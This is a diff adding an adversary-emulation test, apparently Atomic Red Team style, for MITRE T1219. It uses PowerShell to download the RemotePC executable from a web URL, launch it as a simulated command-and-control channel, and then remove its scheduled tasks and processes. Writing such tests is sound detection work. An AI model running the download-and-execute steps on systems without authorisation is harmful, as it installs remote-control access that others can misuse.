@@ -1,0 +1,31 @@
+api_version: "2.0"
+name: RemotePC Software Execution
+description: "An adversary may attempt to trick the user into downloading RemotePC Software for use as a C2 channel. \nUpon successful execution, RemotePC will be executed. \n"
+args:
+    - name: RemotePC_Path
+      type: path
+      default: PathToAtomicsFolder\..\ExternalPayloads\RemotePC.exe
+uuid: fbff3f1f-b0bf-448e-840f-7e1687affdce
+mitre:
+    tactics:
+        - 'TA0011: Command and Control'
+    techniques:
+        - 'T1219: Remote Access Software'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: |
+        RemotePC must exist on disk at the specified location (#{RemotePC_Path})
+      inline: |
+        if (Test-Path "#{RemotePC_Path}") {exit 0} else {{New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+        Invoke-WebRequest "https://static.remotepc.com/downloads/rpc/140422/RemotePC.exe" -OutFile "#{RemotePC_Path}" -UseBasicParsing
+        }}
+      executor: powershell
+    - name: remotepc-software-execution
+      inline: |
+        Start-Process "{{.Args.RemotePC_Path}}"
+      executor: powershell
+      cleanup:
+        inline: "Unregister-ScheduledTask -TaskName \"RemotePC\" -Confirm:$False -ErrorAction SilentlyContinue\nUnregister-ScheduledTask -TaskName \"RPCServiceHealthCheck\" -Confirm:$False -ErrorAction SilentlyContinue\nUnregister-ScheduledTask -TaskName \"ServiceMonitor\" -Confirm:$False -ErrorAction SilentlyContinue\nUnregister-ScheduledTask -TaskName \"StartRPCService\" -Confirm:$False -ErrorAction SilentlyContinue      \nStop-Process -Name \"RemotePCPerformance\" -force -erroraction silentlycontinue\nStop-Process -Name \"RPCPerformanceService\" -force -erroraction silentlycontinue\nStop-Process -Name \"RemotePCUIU\" -force -erroraction silentlycontinue\nStop-Process -Name \"RPCDownloader\" -force -erroraction silentlycontinue\nStop-Process -Name \"RemotePCService\" -force -erroraction silentlycontinue\nStop-Process -Name \"RPCService\" -force -erroraction silentlycontinue\n"
+        executor: powershell
